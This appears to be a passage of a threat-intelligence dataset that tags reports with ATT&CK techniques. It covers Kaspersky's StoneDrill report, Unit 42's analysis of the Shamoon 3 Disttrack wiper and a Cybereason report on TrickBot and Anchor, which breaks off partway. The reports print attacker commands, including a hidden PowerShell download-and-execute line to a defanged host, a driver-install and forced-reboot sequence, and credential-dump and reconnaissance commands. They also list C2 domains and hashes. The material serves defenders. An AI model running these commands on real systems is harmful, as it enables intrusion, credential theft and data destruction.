14 68 B4 0F 00 00 FF 15 4C B0 63 00 B8 08 00 FE 7F FF 30 8F 44 24 10 8B 44
24 10 33 D2 2B 44 24 14 B9 80 96 98 00 F7 F1 2C 02 A2 61 D6 64 00
,
Contact:
intelreports@kaspersky.com
25
2.9.2. The OS command
In News
B
eef:
In StoneDrill:
,
Contact:
intelreports@kaspersky.com
26
2.9.3. The Update command
In News
B
eef:
In StoneDrill:
2.9.4. The Strings Decryption routine
In News
B
eef:
In StoneDrill:
,
Contact:
intelreports@kaspersky.com
27
2.9.5. The Payload Winmain
In News
B
eef:
In StoneDrill:
2.9.6. Command center name similarities
Besides the technical code similarities listed above, we noticed that the naming scheme for
the
News
B
eef and StoneDrill C&Cs is quite similar. For instance:
StoneDrill
NewsBeef
www.chromup[.]com
www.chrome
-
up[.]date
service1.chrome
-
up[.]date
service.chrome
-
up[.]date
www.eservic[.]com
webmaster.serveirc[.]com
,
Contact:
intelreports@kaspersky.com
28
3. Conclusions
Our discovery of StoneDrill gives another dimension to the existing wave of wiper attacks
against Saudi organizations that started with Shamoon 2.0 in November 2016. Comp
ared to the
new Shamoon 2.0 variants, the most significant difference is the lack of a disk driver used for
direct access during the destructive step. Nevertheless, one does not necessarily need raw disk
access to perform destructive functions at file leve
l, which the malware implements quite
successfully.
Of course, one of the most important questions here is the connection between Shamoon and
StoneDrill. Both wipers appear to have been used against Saudi organizations during a similar
timeframe of October
-
November 2016. Several theories are possible here:
●
StoneDrill is a less
-
used wiper tool
,
deployed in certain situations by the same Shamoon
group
.
●
StoneDrill and Shamoon are used by different groups which are aligned in their interests
.
●
StoneDrill and
Shamoon are used by two different groups which have no connection to
each other and just happen to target Saudi organizations at the same time
.
Taking all factors into account, our opinion is
that
the most likely theory is the second.
Additionally, Stone
Drill appears to be connected with previously reported News
B
eef activity,
which continues to target Saudi organizations. From this point of view, News
B
eef and StoneDrill
appear to be
continuously
focused
on targeting Saudi interests, while Shamoon is a fla
shy,
come
-
and
-
go high impact tool.
In terms of attribution, while Shamoon embeds Arabic
-
Yemen resource language sections,
StoneDrill embeds mostly Persian resource language sections. Geopolitical analysts would be
quick to point out that Iran and Yemen are
both players in
the Iran
-
Saudi Arabia proxy conflict
.
Of course, we do not exclude the possibility of false flags.
Finally, many unanswered question
remain in regards to StoneDrill and News
B
eef. The
discovery of the StoneDrill wiper in Europe is a significant sign
that
the group is expanding
its
destructive attacks outside the Middle East. The target for the attack appears to be a large
corporation wi
th a wide area of activity in the petro
-
chemical sector, with no apparent
connection or interest in Saudi Arabia.
As usual, we will continue to monitor the Shamoon, StoneDrill and News
B
eef attacks. A
presentation about StoneDrill will be given at the Kaspe
rsky Security Analyst Summit
Conference, on April 2
-
6, 2017.
Kaspersky Lab products detect the Shamoon and StoneDrill samples as:
Trojan.Win32.EraseMBR.a
Trojan.Win32.Shamoon.a
,
Contact:
intelreports@kaspersky.com
29
Trojan.Win64.Shamoon.a
Trojan.Win64.Shamoon.b
Backdoor.Win32.RemoteConnection.
d
Trojan.Win32.Inject.wmyv
Trojan.Win32.Inject.wmyt
HEUR:Trojan.Win32.Generic
,
Contact:
intelreports@kaspersky.com
30
4. Appendices
4.1. Indicators of Compromise
4.1.1. Shamoon MD5s
00c417425a73db5a315d23f ac8cb353f
271554cff 73c3843b9282951f 2ea7509
2cd0a5f 1e9bcce6807e57ec8477d222a
33a63f 09e0962313285c0f 0f b654ae11
38f 3bed2635857dc385c5d569bbc88ac
41f 8cd9ac3f b6b1771177e5770537518
5446f 46d89124462ae7aca4f ce420423
548f 6b23799f 9265c01f eef c6d86a5d3
63443027d7b30ef 0582778f 1c11f 36f 3
6a7bff 614a1c2f d2901a5bd1d878be59
6bebb161bc45080200a204f 0a
1d6f c08
7772ce23c23f 28596145656855f d02f c
7946788b175e299415ad9059da03b1b2
7edd88dd4511a7d5bcb91f 2ff 177d29d
7f 399a3362c4a33b5a58e94b8631a3d5
8405aa3d86a22301ae62057d818b6b68
8712cea8b5e3ce0073330f d425d34416
8f be990c2d493f 58a2af a2b746e49c86
940cee0d5985960b4
ed265a859a7c169
9d40d04d64f 26a30da893b7a30da04eb
aae531a922d9cca9ddca3d98be09f 9df
ac8636b6ad8f 946e1d756cd4b1ed866d
af 053352f e1a02ba8010ec7524670ed9
b4ddab362a20578dc6ca0bc8cc8ab986
baa9862b027abd61b3e19941e40b1b2d
c843046e54b755ec63ccb09d0a689674
d30cf a003ebf cd4d7c659a73a8dce11e
,
Contact:
intelreports@kaspersky.com
31
da3d900f 8b090c705e8256e1193a18ec
dc79867623b7929f d055d94456be8ba0
ec010868e3e4c47239bf 720738e058e3
ef ab909e4d089b8f 5a73e0b363f 471c1
4.1.2. StoneDrill MD5s
ac3c25534c076623192b9381f 926ba0d
0ccc9ec82f 1d44c243329014b82d3125
8e67f 4c98754a2373a49eaf 53425d79a
f b21f 3cea1aa051ba2a45e75d46b98b8
4.1.3. StoneDrill C2s
www.eservic[.]com
www.securityupdated[.]com
www.actdire[.]com
www.chromup[.]com
4.1.4. NewsBeef C2s
www.chrome
-
up[.]date
service1.chrome
-
up[.]date
service.chrome
-
up[.]d
ate
webmaster.serveirc[.]com
",['S0380']
https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/,['enterprise-attack'],['impact'],"['Disk Structure Wipe', 'Data Destruction', 'Disk Structure Wipe']","['T1487', 'T1485', 'T1561.002']","
Shamoon 3 Targets Oil and Gas Organization
Protect Against Russia-Ukraine Cyber Activity
Menu
Tools
ATOMs
Security Consulting
About Us
Under Attack?
Shamoon 3 Targets Oil and Gas Organization
59,985
people reacted
3
6
min. read
Share
By Robert Falcone
December 13, 2018 at 10:52 AM
Category: Unit 42
Tags: Disttrack, Shamoon
This post is also available in:
日本語 (Japanese)Summary
On December 10,
a new variant of the Disttrack malware was submitted to VirusTotal (SHA256:c3ab58b3154e5f5101ba74fccfd27a9ab445e41262cdf47e8cc3be7416a5904f) that shares a considerable amount of code with the Disttrack malware used in the Shamoon 2 attacks in 2016 and 2017 that we previously published here, here, and here. While we could not identify the impacted organization from the malware, today Saipem disclosed they were attacked. In previous attacks, we were able to determine the impacted organization based on the domain names and credentials used by the Disttrack tool to spread to other systems on the network. However, that functionality was missing from this sample. Unlike past Shamoon attacks, this particular Disttrack wiper would not overwrite files with an image. Instead it would overwrite the MBR, partitions, and files on the system with randomly generated data.
According to a press release,
Saipem confirmed that they experienced a cyberattack that involved a variant of the Shamoon malware. The attack caused infrastructure and data availability issues, forcing the organization to carry out restoration activities. Saipem told Reuters that 300 systems on their network were crippled by the malware related to the 2012 Shamoon attacks. While we cannot definitively confirm that Saipem was the impacted organization, the timing of this incident with the emergence of the Disttrack sample discussed in this blog is quite coincidental.
Dropper
The sample submitted to VirusTotal is a Disttrack dropper, which is responsible for installing a communications and wiper module to the system. The dropper is also responsible for spreading to other systems on the same local network, which it accomplishes by attempting to log into other systems on the network remotely using previously stolen usernames and passwords. Unfortunately, this particular sample does not contain any domains, usernames, or passwords to perform this spreading functionality, so this sample would only run on the system in which it was specifically executed.
The dropper has a hardcoded kill time of '12/7/17 23:51'; if the system date is after this date the dropper installs the wiper module and starts wiping files on the system. The dropper reads the '%WINDOWS%\inf\mdmnis5tQ1.pnf' file to obtain a custom kill date that it will use instead of the hardcoded time. The communications module installed by the dropper writes to this file, which will be discussed in a later section. The dropper also decrypts a string '\inf\averbh_noav.pnf' that is the other file that the communications module uses to write system information to and if the wiper was able to successfully wipe the system, but the dropper does not appear to use this file.
The dropper has three resources, two of which contain embedded modules, specifically a communications module and a wiper module. The third resource contains an x64 variant of the dropper, which it will use if the architecture of the system is determined to be x64. The resources have a language set to ‘SUBLANG_ARABIC_YEMEN’ that was also found in the previous Disttrack samples used in Shamoon 2 attacks. The resource names are PIC, LNG, and MNU, which are slightly altered versions of the ICO, LANG, and MENU names found in previous samples.
The dropper extracts modules from these resources by seeking a specific offset and reading a specific number of bytes as the length of the ciphertext. The dropper then decrypts the ciphertext by using an XOR cipher and a specific base64 encode string that is decoded and used as the key. Before accessing the ciphertext, the dropper subtracts 14 from the specified offset, which is the same as previous Disttrack samples delivered in Shamoon 2 attacks. Tables 1, 2, and 3 include the resources, the information used to extract them, and the resulting module.
Resource name
PIC
Description
x64 variant of Dropper
Base64 Key
2q9BQGHGVktPVIMZ6Nx17Njp4B5mHgj51hbybNInRWsNIWniq6hOYvf5CksMXvPOyl/3dYKDn7ymSGlK0+l5KA8YC8dzkkAwmn0nbBO97HgjJKJyL9DoiYKsO2M+A44NgOI89FIsWjcex9oEWzOo6VvxJ69HBvg+L4FExlbd8ZfvGewxgPgl98lqVGj14y5OBFIHTdvfxnnq/cTR55TgQdVDFUJHd2ljyzDl3LKPSUxT9sIE1aS7EA==
Offset
8786-14
Length
983552
SHA256 of Cleartext
0975eb436fb4adb9077c8e99ea6d34746807bc83a228b17d321d14dfbbe80b03
Table 1 Resource containing the x64 variant of the Disttrack dropper
Resource name
MNU
Description
Communications module
Base64 Key
U3JGgjNUDzWJEpOxzuwHjOijgav56cZatHh98dLbazGIBe7UMOcvdyCvU5/8mH1n7jUcMSIPFmqr7M671h5jradiKMn9M1sBdAmKSZUnXhz6FQKcvzkOee6EKEQZdKABTKX4mW+0arvZG70YhczUhI2ywcEcx+5tU6/aeQoX6ABoiP3wLsSsRatGwqR89fMir6S2Z7Lf5YW3i0a/2vCxwjK9r/zO5FXJBXsV1QRJ8F27t8pmYYFNiaN4OaN+7Gu7lf8=
Offset
8601-14
Length
266752
SHA256 of Cleartext
0694bdf9f08e4f4a09d13b7b5a68c0148ceb3fcc79442f4db2aa19dd23681afe
Table 2 Resource containing the communications module in the Disttrack dropper
Resource name
LNG
Description
Wiper module
Base64 Key
cb5F91PLTu1hN8oPgG2a6AQiJkphsXAmWFarsUoYEFo/BNgxF8Rj/hdzHxW/k/fLCZboSJRLnr9OH578IJyiSSdvz3uUaNA/vycy7ZJaZ8Vf36i0L8fF9GYY4/glZt570dbuT8N7N6DFqIltGLAt87fZnUH07RlfqtsVfITXGlhJtxu7bBgB46gH74Y+WNy16u9BS8mdh+S8jqToZrob7o4wI2CUcoaf17mZ7P2SIVL+X5GVls6OrDA3/t50GX3t6wH4DTR7IHhoonQPA5rmKWxS6gcp
Offset
7892-14
Length
402432
SHA256 of Cleartext
391e7b90bf3f0bfeb2c2602cc65aa6be4dd1c01374b89c4a48425f2d22fe231c
Table 3 Resource containing the wiper module within the Disttrack dropper
The dropper will install itself to the system (and remote systems if spreading was possible) by creating a service with the attributes listed in Table 4 below.
Service name
MaintenaceSrv
Service display name
Maintenace Host Service
Service description
The Maintenace Host service is hosted in the LSA process. The service provides key process isolation to private keys and associated cryptographic operations as required by the Common Criteria. The service stores and uses long-lived keys in a secure process compl\x1d
Binary path
MaintenaceSrv32.exe or MaintenaceSrv64.exe
Table 4 Service created by the Disttrack dropper
The dropper chooses a random name when installing the communication and wiper modules to the system. The communications module will have one of the following filenames with the ‘exe’ file extension:
netnbdrve
prnod802
netrndiscnt
netrtl42l
mdmadccnt
prnca00
bth2bht_ibv32
cxfalcon_ibL32
mdmsupr30
digitalmediadevicectl
mdmetech2dmv
netb57vxx
winwsdprint
prnkwy005
composite005
mdmar1_ibv32
prnle444
kscaptur_ibv32
mdmzyxlga
usbvideob
input_ibv48
prnok002_ibv
averfx2swtvZ
wpdmtp_ibv32
mdmti_ibv32
printupg_ibv32
wiabr788
The wiper module will have one of the following filenames with the ‘exe’ file extension:
_wialx002
__wiaca00a
tsprint_ibv
acpipmi2z
prnlx00ctl
prngt6_4
arcx6u0
_tdibth
prncaz90x
mdmgcs_8
mdmusrk1g5
netbxndxlg2
prnsv0_56
af0038bdax
averfix2h826d_noaverir
megasasop
hidirkbdmvs2
vsmxraid
mdamx_5560
wiacnt7001
Wiper
The wiper module (SHA256: 391e7b90bf3f0bfeb2c2602cc65aa6be4dd1c01374b89c4a48425f2d22fe231c) that the dropper writes to the system is responsible for overwriting the data within the MBR, partitions, and files on the system. The wiper carries out this wiping using a legitimate hard disk driver called RawDisk by ElDos. The wiper contains the ElDos RawDisk driver in a resource named 'e' that it extracts by skipping to offset 1984 and reading 27792 bytes from that offset. It then decrypts the data using aa 247-byte key and saves it to ‘%WINDOWS%\system32\hdv_725x.sys’. The wiper then creates a service named ‘hdv_725x’ for this driver using the following command line command and runs it with ""sc start hdv_725x"":
sc create hdv_725x type= kernel start= demand binpath= %WINDOWS%\system32\hdv_725x.sys
This wiper was configured using the ‘R’ flag, which generates a buffer of random bytes that it will use to overwrite the MBR, partitions and files. The sample supports two additional configuration flags as well, specifically ‘F’ and ‘E’ flags that will either overwrite files using a file or encrypt its contents.
The wiper could be configured to use a file to overwrite the files on the disk using the ‘F’ configuration flag, as we saw images used to overwrite files in previous Shamoon attacks. This file would be stored in a resource named ‘GRANT’, but this particular wiper is not configured to use a file for overwriting so the GRANT resource does not exist. If it were configured to use a file, this sample would extract the file using the information listed in Table 5.
Resource name
GRANT
Description
File to overwrite within Wiper module
Base64 Key
heocXOK4rDmQg4LRfiURI9wSOuSMwe0e69NfEpZLmyNixiUGYdEtpx/ZG3rMRN7GZlJ1/crQTz5Bf6W0xgkyYCwzD247FolCGA0EE5U/Oun5qlDd1u1CA+fee7cG
Offset
71-14
Length
<unknown>
SHA256 of Cleartext
<unknown>
Table 5 Resource in wiper module that would contain file to use for overwriting data
This sample is also capable of being configured to import an RSA key to encrypt the MBR, partitions, and files via configuration flag ‘E’. This sample was not configured to encrypt files, and the RSA key is empty in the wiper.
After completing this wiping functionality, the sample will reboot the system using the following command line, which will render it unusable when the system reboots as the important system locations and files have been overwritten with random data:
shutdown -r -f -t 2
Communications
The communications module (SHA256: 0694bdf9f08e4f4a09d13b7b5a68c0148ceb3fcc79442f4db2aa19dd23681afe) dropped by the Disttrack dropper will use the following two supporting files:
%WINDOWS%\inf\mdmnis5tQ1.pnf - Used to set a wipe date for associated wiper module
%WINDOWS%\inf\averbh_noav.pnf - Used to mark successful wiping
The communications module is responsible for reaching out to hardcoded URLs to communicate with the C2 server, but like previous Disttrack samples, this communication module does not contain functional C2 domains to use in the URLs. If it did, it would create a URL with a parameter named 'selection' followed by system information and the contents of the 'averbh_noav.pnf' file, as seen here:
[C2 URL, empty]?selection=[system info and contents of averbh_noav.pnf]
When communicating with the C2 URL, the communications module would use a User Agent of 'Mozilla/13.0 (MSIE 7.0; Windows NT 6.0)', which is the same as past Disttrack communication module samples. Table 6 below show the two commands the C2 could respond with that the communications module could handle.
Command
Description
E
Reads base64 encoded file from the C2 server, runs 'del /f /a %TEMP%\Temp\reilopycb\*.exe' to delete previously downloaded executables, runs 'mkdir %TEMP%\Temp\reilopycb] > nul 2>&1' to create a folder and saves the executbale to a file named '[tick count].exe'. The Trojan then runs the downloaded executable %TEMP%\Temp\reilopycb\[tick count].exe'
T
Opens the '\inf\mdmnis5tQ1.pnf' file and writes a supplied date to the file. The '\inf\mdmnis5tQ1.pnf' file is used by another associated module to this communications module that is responsible for wiping the system.
Table 6 Commands available within the communication module's command handler
Conclusion
The Disttrack sample uploaded to VirusTotal is a variant of the samples used in the Shamoon 2 attacks in 2016 and 2017. The tool does not have the capability to spread to other systems on the local network. Instead it would have to be loaded onto and executed on the system that the actors intend to wipe. The wipe date of '12/7/2017' does not seem timely. However, this older date is still effective as the Disttrack dropper will install and run the wiper module as long as the system date is after the wipe date. Unlike past Shamoon attacks, this particular Disttrack wiper would not overwrite files with an image. Instead, it would overwrite the MBR, partitions and files on the system with random data. While we can’t confirm this sample was used in the Saipem attack, it is likely at least related to it.
Palo Alto Networks customers are protected from this threat:
WildFire detects all samples associated with this attack with malicious verdicts
AutoFocus customers can track this attack and previous Shamoon attacks using the Disttrack
Indicators of Compromise
c3ab58b3154e5f5101ba74fccfd27a9ab445e41262cdf47e8cc3be7416a5904f - Disttrack Dropper x86
0975eb436fb4adb9077c8e99ea6d34746807bc83a228b17d321d14dfbbe80b03 - Disttrack Dropper x64
0694bdf9f08e4f4a09d13b7b5a68c0148ceb3fcc79442f4db2aa19dd23681afe - Disttrack Comms module x86
391e7b90bf3f0bfeb2c2602cc65aa6be4dd1c01374b89c4a48425f2d22fe231c - Disttrack Wiper module x86
6985ef5809d0789eeff623cd2436534b818fd2843f09fa2de2b4a6e2c0e1a879 - ElDos RawDisk Driver x86
ccb1209122085bed5bded3f923835a65d3cc1071f7e4ad52bc5cf42057dd2150 - Disttrack Comms module x64
dab3308ab60d0d8acb3611bf364e81b63cfb6b4c1783864ebc515297e2297589 - Disttrack Wiper module x64
bc4513e1ea20e11d00cfc6ce899836e4f18e4b5f5beee52e0ea9942adb78fc70 - ElDos RawDisk Driver x64
Get updates from
Palo Alto Networks!
Sign up to receive the latest news, cyber threat intelligence and research from us
Please enter your email address!
Please mark, I'm not a robot!
By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.
Popular ResourcesResource Center
Blog
Communities
Tech Docs
Unit 42
Sitemap
Legal NoticesPrivacy
Terms of Use
Documents
AccountManage Subscriptions
Report a Vulnerability
© 2022 Palo Alto Networks, Inc. All rights reserved.
",[]
https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware,['enterprise-attack'],['credential-access'],['Password Managers'],['T1555.005'],"
Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware
Back to Cybereason.com
All Posts
Research
Podcasts
Webinars
Resources
Videos
News
Subscribe
Subscribe
All
Research
Podcasts
Webinars
Resources
Videos
News
Search
Subscribe
X
Search
Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware
Written By
Cybereason Nocturnus
December 11, 2019
|
15 minute read
Introduction
Research By: Assaf Dahan, Lior Rochberger, Eli Salem, Mary Zhao, Niv Yona, Omer Yampel and Matt Hart
Cybereason Nocturnus is monitoring a new wave of targeted campaigns against financial, manufacturing and retail businesses that began in early October. Similar to attacks previously reported by Cybereason, this campaign started with a TrickBot infection and progressed into a hacking operation targeting sensitive financial systems.
However, unlike previous operations that focused on causing a massive ransomware infection (Ryuk and LockerGoga) by compromising critical assets like the domain controller, this new operation is focused on targeting point of sale (PoS) systems. The campaign leverages a newly discovered malware family called Anchor exclusively for high-profile targets.
Learn more about additional attacks that leverage TrickBot.
This research focuses on the following aspects of the TrickBot-Anchor attack:
Anatomy of the Attack: A step-by-step anatomy of the attacks, including infection vectors and a dissection of the tools and techniques used by the attackers.
New Malware: The discovery of a new malware family called Anchor, which includes the Anchor_DNS and a new, undocumented Anchor that has been operating since August 2018 (and potentially even earlier). The Anchor malware is a backdoor used very selectively on high-profile targets, and appears to be tightly connected to TrickBot, potentially even authored by the same individuals who created TrickBot.
While this blog does not discuss attribution explicitly, the nature of these attacks, specifically the motivation, some of the tools and techniques detailed,
have certain resemblance to past attacks that were linked to the financially-motivated FIN6 threat actor, a group that is known to target POS systems and has been linked to TrickBot infections in the past.
Lastly, our blog emphasizes the gravity and danger that lies in commodity malware infections, as they have the potential of escalating into a hacking operation. This can easily lead to a disastrous outcome, whether it be a ransomware infection or theft of sensitive financial data.
Key Points
The TrickBot-Anchor Operation: Cybereason Nocturnus is investigating a series of targeted attacks against financial, manufacturing, and retail businesses across the United States and Europe.
Targets POS Systems: The attacks target POS systems to steal sensitive information by taking over critical assets in the victims’ network.
Deploys A Backdoor on High-value Targets: On certain high-profile targets, the attackers selectively use a new variant of the rare Anchor_DNS tool. Anchor_DNS is a backdoor that uses the DNS protocol to stealthily communicate with C2 servers.
Uses a New, Undocumented Malware: In addition to the new Anchor_DNS variant, the attackers use a completely new and previously undocumented malware dubbed Anchor. Anchor has been in operation since August 2018 and appears to be tightly related to TrickBot.
Adds Enhancements to TrickBot: This attack adds a new and enhanced stealing module to TrickBot that focuses on stealing passwords from various products, including the KeePass password manager.
Uses Known Tools for Reconnaissance and Lateral Movement: The majority of the initial interactive hacking operation uses the known tools Meterpreter, PowerShell Empire, and Cobalt Strike for reconnaissance and lateral movement.
Abuses the Trust of Certificate Authorities: Many of the payloads in the attacks are signed binaries, which demonstrates the ever-growing trend of signed threats that abuse the trust of certificate authorities to bypass detection.
Table of Contents
Anatomy of the Attack: A Step-by-Step Analysis
Infection Vector
From TrickBot Infection to Interactive Hacking
Meterpreter & Cobalt Strike Implants
Active Directory Discovery using ADfind
New Anchor_DNS Variant Discovered
Discovery of The Anchor Malware and its Connection to TrickBot
Rise of Signed Malware
Conclusion
Indicators of Compromise
MITRE ATT&CK BREAKDOWN
Anatomy of the Attack: A Step-by-Step Analysis
An overview of the attack tree, as seen in the Cybereason Defense Platform.
Infection Vector
Downloading and injecting TrickBot.
The attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named “Annual Bonus Report.doc”. When the user clicks on the link, the TrickBot dropper downloads onto the target machine. This differs from previous TrickBot attacks we have seen, where TrickBot is usually dropped through a Microsoft Office document or by another malware like Emotet.
Phishing email that tricks the user into downloading TrickBot.
The TrickBot Downloader
The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document. When the user double-clicks the file, they are presented with a decoy message box. To avoid suspicion, the decoy message suggests the user should update Microsoft Word or open the file from another computer.
TrickBot displays a message box suggests updating Microsoft Word or opening the file on another computer to preview the document.
While at first glance these files can be mistaken for legitimate Microsoft Word files, a closer inspection of the file metadata indicates they are not associated with Microsoft Word, nor are they Microsoft Word document files.
Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools. They abuse the relative trust that is given to signed binaries to avoid detection.
File metadata properties for the fake Microsoft Word Document.
Signed malware is an evasive initial entry point into an organization.
The message box distracts the user as TrickBot’s payload is downloaded, stored in the %TEMP% folder, and executed. A new process injects the TrickBot payload into a svchost.exe process.
svchost.exe injected code malicious evidence as seen in the Cybereason Platform.
Domain associated with the TrickBot payload download.
The TrickBot Payload
Once TrickBot’s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network. This information is crucial, as it determines the course of the attack.
Checking Network Connectivity
TrickBot checks for Internet connectivity by trying to access several designated domains. These domains are preconfigured and belong to legitimate web services, including: checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, ip.anysrc.net.
Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains. It collects and sends information about where the target machine is located to the C2 servers.
Browser History and Credential Theft
After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity. The module core-parser.dll is reflectively loaded into svchost.exe. core-parser.dll parses the TrickBot config files and extracts IP addresses for secondary C2 communication, redirection, and web injection logic.
core-parser.dll injected into svchost.dll.
TrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server. The C2 server is responsible for handling the stolen data.
A list of C2 servers extracted from TrickBot’s configuration.
TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).
esentutl /p /o C:\Users\[USER]\AppData\Local\Temp\grabber_temp.edb
This command dumps the Extensible Storage Engine (ESE) database format.
Application-specific Credential Theft
This variant of TrickBot employs a new, unique ability to steal passwords from KeePass, a free, open- source password manager. TrickBot's KeePass stealing capabilities seem to be inspired (or even partially copy-pasted) from a publicly available tool dubbed PoshKPBrute, a script that performs a dictionary attack against KeePass .kdbx files. Once it finds the dictionary key, it dumps all passwords as an output and sends the attackers the master password.
KeePass stealing brute force tool.
TrickBot’s stealer module also tries to extract keys from Filezilla, OpenSSH and OpenVPN.
TrickBot attempting to steal keys from Filezilla, OpenSSH, and OpenVPN.
Reconnaissance Commands
In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe. They gather information on:
All trusted domains, domains, and domain controllers
A list of computers and network devices on the network
The infected machine user and groups the user belongs to
The infected machine, including machine name, operating system, workstation domain, and more information
Network adapters that have connected to the machine and DNS servers
The net.exe process tree.
Nltest / domain_trusts /all_trustsNet view /allNltest /domain_trustsNet view /all /domainIpconfig /allNet config workstationNslookup “-q=srv_kerberos._tcp”/c “start microsoft-edge:http://127.0.0.1:52715/11984”
Reconnaissance commands launched by TrickBot.
The attacker also uses PowerShell to test DNS entry settings. They use the command -q=srv_kerberos_tcp on the process nslookup.exe to open an interactive shell. They use the shell to expand their search to other machines on the network by searching for things like a list of the domain controllers.
TrickBot testing DNS settings.
With this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.
From TrickBot Infection to Interactive Hacking
The threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target. If so, they escalate their efforts by switching to interactive hacking: reconnaissance, credential dumping, lateral movement, and in some cases the mass deployment of ransomware across endpoints connected to the domain controller.
PowerShell Payloads
The threat actor leverages PowerShell to send additional payloads to the target machine. They issue commands to fetch a payload from a secondary server and, once it’s downloaded, immediately execute it on the target machine through PowerShell.
powershell.exe -nop -WindowStyle Hidden -executionpolicy bypass -c ""IEX ((new-object net.webclient).downloadstring('hxxps://northracing[.]net/?a=irs&x=[base64]'))""
The northracing[.]net URL contains a PowerShell script in the contents of the webpage. Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity. The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation. If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from. Each POST request is sent along with a UUID generated from the user’s hostname and the current process ID.
Information sent along each POST request in the payload.
A POST request containing basic information about the machine is sent, which includes the current user and their domain, the root of the file system, and information about the operating system.
The PowerShell payloads using WMI to probe for system information.
This information is sent to the C2 along with the `i` parameter. When a response is received, the payload checks to see if the response matches the value cex01. If it does, the PowerShell script stops executing and kills the task. If the response is any other value, the script sets a timeout variable based on the response and continues to the main loop.
This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.
The main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.
The main loop that sends a POST request to the server.
Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet. The output of the command is sent back to the C2 server using a POST request with the “a” parameter.
Meterpreter & Cobalt Strike Implants
The attack tree demonstrating the beginning of the hacking operation using Meterpreter.
Meterpreter Implant
The attackers use a Meterpreter implant to carry out post-exploitation actions. The Cybereason Platform detects both the shellcode and various Meterpreter DLLs reflectively loaded to memory. The detected DLLs include:
Metsrv.dll: For Meterpreter, where the protocol and extension systems are implemented
Ext_server_priv.x86.dll: For privilege escalation
Ext_server_stdapi.x86.dll: A metasploit post exploitation module used for reconnaissance
Cybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.
Examining the loaded modules shows which Metasploit modules are loaded.
The Meterpreter agent creates a connection to port 4444 on the external IP address 91.12.89[.]129.
Cobalt Strike Implant
Using Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.
Attackers injecting Cobalt Strike and other Metasploit payloads into the rundll32.exe process.
Detection of Cobalt Strike, Meterpreter, and shellcode execution.
The attacker uses the following metasploit modules:
ext_server_extapi.x86.dll: Obtains clipboard data and manipulates and decrypts the NTDS file
ext_server_priv.x86.dll: Performs privilege escalation
Ext_server_stdapi.x86.dll: Performs reconnaissance activity
Bypassuac.x64.dll: A post-exploitation module used to bypass User Account Control
Post-exploitation modules reflectively loaded to rundll32.exe
The connection to the external IP address 199.217.115[.]53 on port 8443.
Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.
Active Directory Discovery using Cobalt Strike
The threat actor uses known Cobalt Strike modules to enumerate Active Directory information:
https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Invoke-DACheck.ps1
https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Initial-LAdminCheck.cna
The attackers execute several Base64-encoded PowerShell commands in order to determine if the infected machine’s user is in the admin or domain admin group.
After verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an additional Base64-encoded and compressed PowerShell command.
The obfuscated and compressed PowerShell command.
The decoded PowerShell command that attempts to gather domain controller information.
Active Directory Discovery using ADfind
The attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.
adfind.exe -f ""(objectcategory=organizationalUnit)""adfind.exe -gcb -sc trustdmpadfind.exe -f ""objectcategory=computer""adfind.exe -sc trustdmpadfind.exe -f ""(objectcategory=person)""adfind.exe -subnets -f (objectCategory=subnet)adfind.exe -f ""(objectcategory=group)""
The ADfind tool has reportedly been used previously in attacks related to FIN6.
New Anchor_DNS Variant Discovered
One of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT Security. It is classified by NTT as a variant of the infamous TrickBot malware, which uses DNS tunneling to stealthily communicate with C2 servers. Though this variant was first discovered in October 2019, there is evidence that Anchor_DNS was used as far back as March 2019.\
Oldest Anchor_DNS sample observed, SHA-1: b388243bf5899c99091ac2df13339f141659bbd4
This new variant acts as a sophisticated, stealthy backdoor that selectively chooses high-profile targets. Anchor_DNS is still undergoing rapid development cycles with code changes and new feature updates every few weeks.
This is a new variant of Anchor_DNS that appeared as early as November 2019 and exhibits the following changes in code and behavior:
No self-deletion mechanism shown in previous samples
No internet connectivity checks using legitimate online web services
A built-in capability to check for C2 availability using ICMP (ping)
Additional partial string encryption and code obfuscation
Static Analysis Observations
File name
SHA-1
anchorDNS_x64.exe
5f1ad1787106de9725005d8da33d815d0994ee83
anchorDNS_x64.exe contains a PDB path with the name of the malware, Anchor_DNS. This file is the 64-bit version of Anchor_DNS, however, there were earlier instances of the 32-bit version as well. The project name shows that this is the fifth version of Anchor_DNS.
